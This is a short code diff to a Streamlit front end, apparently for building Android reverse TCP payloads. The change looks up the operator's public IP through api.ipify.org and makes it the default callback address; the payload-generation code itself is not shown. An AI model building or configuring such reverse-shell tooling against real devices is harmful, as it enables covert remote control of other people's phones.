@@ -2,6 +2,7 @@ import streamlit as st
 import subprocess
 import os
 import re
+import requests
 
 def is_valid_ip(ip):
     # Simple regex-based IP address validation
@@ -44,7 +45,8 @@ def generate_payload(ip, port, output_file, apk_path):
 
 st.title("Android Reverse TCP Payload Generator")
 
-ip = st.text_input("Enter IP Address:", value="0.0.0.0")
+public_ip = requests.get('https://api.ipify.org').text
+ip = st.text_input("Enter IP Address:", value=public_ip)
 port = st.number_input("Enter Port:", min_value=1, max_value=65535, value=8080)
 output_file = "payload"
 
